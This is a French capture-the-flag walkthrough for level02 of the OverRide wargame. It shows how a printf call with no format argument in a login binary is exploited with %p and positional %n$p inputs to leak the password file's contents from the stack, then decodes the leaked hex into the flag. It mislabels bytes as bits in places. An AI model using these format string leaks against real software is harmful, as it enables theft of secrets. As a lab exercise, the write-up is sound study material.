# Level 02

```
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: test
--[ Password: test
*****************************************
test does not have access!
```

Ce programme prend deux inputs.

Apres decompilation, nous constatons plusieurs choses, le fichier du pass est ouvert, puis est copie dans passwordFromFile.

Si le fichier ne peux etre lu, exit le programme.
Cette condition nous empeche de break dans gdb car faute de droits.

Puis les deux inputs sont copie respectivement dans username et password.

Une comparaison est faite entre le mot de passe du fichier et le mot de passe, et si identique ouvre un shell nais nous ne pouvons pas exploiter cette condition

Cependant le dernier printf qui affiche le nom d'utilisateur, a savoir username, est appele sans l'argument de format.

Nous allons pouvoir utiliser l'exploit format string, qui consiste a donner le format directement dans la chaine afin d'afficher des zones memoire.

Comme le contenu du fichier est copie dans une variable, nous sommes cense trouver son contenu en memoire. Cherchons dans gdb son emplacement.


Le desassemblage dans gdb etant long, seules les lignes interessantes sont gardes.
```
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400814 <+0>:     push   %rbp <=== la zone memoire ou le programme est charge est sur rbp.
   0x0000000000400815 <+1>:     mov    %rsp,%rbp
   0x0000000000400818 <+4>:     sub    $0x120,%rsp

   0x0000000000400909 <+245>:   lea    -0xa0(%rbp),%rax <== ici nous sommes juste apres l'appel de fread. le contenu du fichier est copie a rbp - 0xa0

   0x0000000000400a96 <+642>:   lea    -0x70(%rbp),%rax <== ici nous somme juste apres la comparaison du mot de passe et du contenu du fichier, on aligne le pointeur sur rbp - 0x70 car ici se trouve la variable username (username)

End of assembler dump.
```

Nous avons donc l'emplacement memoire de passwordFromFile et username.

Pour afficher la valeur avec printf, nous allons calculer l'offset du buffer de printf.

```
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: AAAA%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|
--[ Password: *****************************************
AAAA0x7fffffffe4f0|(nil)|0x7c|0x2a2a2a2a2a2a2a2a|0x2a2a2a2a2a2a2a2a|0x7fffffffe6e8|0x1f7ff9a08|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|0x257c70257c70257c|0x7c70257c70|(nil)|0x100000000|(nil)|0x756e505234376848|0x45414a3561733951|0x377a7143574e6758|0x354a35686e475873|0x48336750664b394d|0xfeff00|0x257c702541414141|0x7c70257c70257c70| does not have access!
```

41414141 se trouve a +28.

Les deux adresses sont espaces de 160(0xa0) - 112(0x70) = 48 bits.

Sachant que %p affiche 8bits nous devons divise 48 par 8 pour avoir la position du debut de la chaine.

28 - (48 / 8) = 22. Donc %22p doit etre le debut de la chaine, le mot de passe contient 41 - 1 caracteres (0x29 - 1("\0")), 40 / 8 = 5. Nous devons affiches 5 %p.

```
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %22$p%23$p%24$p%25$p%26$p
--[ Password:
*****************************************
0x756e505234376848|0x45414a3561733951|0x377a7143574e6758|0x354a35686e475873|0x48336750664b394d does not have access!
```

Nous avons ce code ex hexadecimal, il nous faut convertir chaque bit en decimal, en enlevant d'abord les 0x et comme nous somme en endian, en commencant par la fin de chaque section.

48 68 37 34 52 50 6e 75 51 39 73 61 35 4a 41 45 58 67 4e 57 43 71 7a 37 73 58 47 6e 68 35 4a 35 4d 39 4b 66 50 67 33 48

On utilise dcode.fr pour convertir les valeurs (codage unicode) et nous trouvons : Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H